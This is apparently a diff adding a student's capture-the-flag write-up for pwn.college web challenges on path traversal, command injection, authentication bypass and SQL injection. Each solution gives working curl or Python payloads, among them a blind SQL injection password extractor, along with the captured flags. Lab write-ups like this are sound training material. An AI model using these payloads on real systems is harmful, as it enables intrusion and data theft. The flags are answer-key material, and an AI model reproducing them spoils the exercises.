@@ -1,0 +1,228 @@
+Path Traversal 1:
+
+Commands used : 
+1. ` curl -v http://challenge.localhost:80/%2e%2e%2f%2e%2e%2fflag`
+
+DEBUG: requested_path='/challenge/files/../../flag'
+127.0.0.1 - - [15/Oct/2024 20:53:47] "GET /..%2f..%2fflag HTTP/1.1" 200 -
+
+Explanation : In this challenge we use to the path variable to go up the directories into the root and find the flag.
+Flag: `pwn.college{UI2oqiOm5jiajJ4ehv3RVJp_0V3.ddDOzMDL1kTM2czW}`
+
+
+Path Traversal 2:
+Code used : 
+1. 
+import requests
+
+# Construct the path you want to access
+path = 'fortunes/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/flag'
+
+# URL-encode the path if necessary
+# However, in this case, it's better to leave it as is because Flask will decode it
+url = f"http://challenge.localhost/{path}"
+
+# Send the GET request (POST is not necessary since no data is being sent)
+response = requests.get(url)
+
+print(response.text)
+Explanation : We see that when we use the previous command we go to the fortunes folder, so we go into the fortunes folder and then move up the directory
+Flag: `pwn.college{UHe6gQw_rEP4UVqFJcubBFtoSju.dJjN1YDL1kTM2czW}`
+
+
+CMDi 1:
+
+Commands used : 
+1. `curl 'http://challenge.localhost?directory=;cat%20/flag'`
+
+Explanation : In this challenge, content in directory variable is replaced in the command so using ; and the path of the flag gives us the solution.
+Flag: `pwn.college{cAuUyXk7Y1NGvoab2jgMx7Rc3T6.dVjN1YDL1kTM2czW}`
+
+
+CMDi 2:
+
+Commands used : 
+1. `curl 'http://challenge.localhost?directory=|cat%20/flag'`
+
+Explanation : In this challenge, content in directory variable is replaced in the command so using |(for pipelining, sending output of one command to another). it can also be used to separate two commands, and use the path of the flag for us the solution.
+Flag: `pwn.college{QQA_UaYFnQ4e2KJelXV6ie6yvqx.dRjN1YDL1kTM2czW}`
+
+
+CMDi 3:
+
+Commands used : 
+1. `curl 'http://challenge.localhost?directory=%27%3Bcat%20/flag%3B%27'`
+
+Explanation : In this challenge, content in directory variable is replaced in the command so using encoding for ;,'," to separate two commands, and use the path of the flag for the solution.
+Flag: `pwn.college{EJGVuGlDnp2yiBs-czJD-YtIS-b.dZjN1YDL1kTM2czW}`
+
+
+CMDi 4:
+
+Commands used : 
+1. `curl 'http://challenge.localhost?timezone=UTC%20date%3Bcat%20/flag%3b%20%23'`
+
+Explanation : In this challenge, we will modify the timezone parameter of the url and add an extra command using ; or | , and use the path of the flag for the solution.
+Flag: `pwn.college{4z1bwB_paPlLq07U32-eVE01Egm.dhDOzMDL1kTM2czW}`
+
+
+CMDi 5:
+Commands used : 
+1. `curl 'http://challenge.localhost?filepath=%3Bcat%20/flag%20%3E%20/challenge/output.txt'`
+2. `cat /challenge/output.txt`
+
+Explanation : In this challenge, instead of getting the flag in the output. we will access the flag and write its contents into another location which we the user and the server has access to and that is challenge folder. 
+Flag: `pwn.college{8DX1Xvs3HDtWQtxTcYdfHDA9al6.ddjN1YDL1kTM2czW}`
+
+
+CMDi 6:
+Commands used : 
+1. `curl http://challenge.localhost/?directory=%0Acat%20/flag`
+
+Explanation : In this challenge, we will use a newline feed encodoing in the url. since many of the characters are blocked
+Flag: `pwn.college{gKL4jQqaDkcUi2tVnZuVd9JjsPN.dRzN1YDL1kTM2czW}`
+
+
+
+Authentication Bypass 1:
+Commands used : 
+1. `curl http://challenge.localhost/?session_user=admin`
+
+Explanation : In the server code, in the get request if the session_user parameter is set to admin. it prints the flag.
+Flag: `pwn.college{olpGOV2ancJfRSInnzD6YniX03d.dlDOzMDL1kTM2czW}`
+
+
+
+Authentication Bypass 2:
+Commands used : 
+1. `curl -b "session_user=admin" http://challenge.localhost/`
+
+Explanation : In the server code, in the get request if the session_user cookie is set to admin. it prints the flag.
+Flag: `pwn.college{M6psu9CWaY3Xy2XXdx_zeF68S9k.dJzN1YDL1kTM2czW}`
+
+
+SQLi 1:
+Code used : 
+import requests
+
+url = "http://challenge.localhost/"
+
+data = {
+    'username': 'admin',
+    'pin': '0 OR 1=1'
+}
+
+response = requests.post(url, data=data)
+
+print(response.text)
+
+
+Explanation : In the server code, it expects two form data parameters that are username and pin. we can see the structure of the query and see that no sanitization is provided for the input. so to login to the admin we can just use the above code.
+Flag: `pwn.college{87bda8wNXf6COvQOorHq9DdpIwi.dNzN1YDL1kTM2czW}`
+
+
+SQLi 2:
+Code used : 
+import requests
+
+url = "http://challenge.localhost/"
+
+data = {
+    'username': 'admin',
+    'password': "0' OR '1'='1"
+}
+
+response = requests.post(url, data=data)
+
+print(response.text)
+
+
+Explanation : Just modify the password parameter carefully using single quotes(')
+Flag: `pwn.college{EfMwHmCv6l_vquYP-sxkvRDGLsE.dBTOzMDL1kTM2czW}`
+
+
+SQLi 3:
+Code used : 
+import requests
+
+url = "http://challenge.localhost/"
+
+params = {
+
+    'query': 'admin" UNION SELECT password FROM users WHERE username LIKE "admin'
+}
+
+response = requests.get(url, params=params)
+
+print(response.text)
+
+Explanation : We will join the data ub password column to the query using the UNION command.
+Flag: `pwn.college{s6XoLClv_OWLmlKMccpJyEZfqeK.dFTOzMDL1kTM2czW}`
+
+
+
+SQLi 4:
+Code used : 
+1.
+import requests
+url = "http://challenge.localhost/"
+params = {
+    'query': 'admin" UNION SELECT name FROM sqlite_master WHERE type="table" -- '
+}
+response = requests.get(url, params=params)
+print(response.text)
+
+2.
+import requests
+url = "http://challenge.localhost/"
+params = {
+
+    'query': 'admin" UNION SELECT password FROM users_7757493013 WHERE username LIKE "admin'
+}
+response = requests.get(url, params=params)
+print(response.text)
+
+Explanation : the first query gives us the name of the table in the database. Using that name we will run the 2nd code to get the flag
+Flag: `pwn.college{cmc2muCyjNR21wmCGP-WJij5_hL.dJTOzMDL1kTM2czW}`
+
+
+
+SQLi 5:
+Code used : 
+1.
+import requests
+
+url = "http://challenge.localhost/"
+
+possible_chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-={}[]|\\:;\'",.<>?/`~'
+password = ''
+max_length = 64
+
+# Loop over each position in the password
+for i in range(1, max_length + 1):
+    found = False
+    
+    for c in possible_chars:
+        # Craft the payload for the username field
+        payload_username = f'admin" AND substr(password,{i},1)="{c}" -- '
+        data = {
+            'username': payload_username,
+            'password': 'password'  # Can be anything
+        }
+        # Use a new session for each request to avoid session interference
+        with requests.Session() as session:
+            response = session.post(url, data=data, allow_redirects=False)
+            # Check for redirect (successful login)
+            if response.status_code == 302:
+                password += c
+                print(f"Found character at position {i}: {c}")
+                found = True
+                break
+    if not found:
+        print(f"Character not found at position {i}. Ending search.")
+        break
+
+print(f"Recovered password: {password}")
+
+Explanation : In this challenge we wont be getting any useful output. we use substr command to check every character and find the correct one and appending it to the flag.
+Flag: `pwn.college{cauPELBvOCYTLw9mCehR8ksENgj.dNTOzMDL1kTM2czW}`
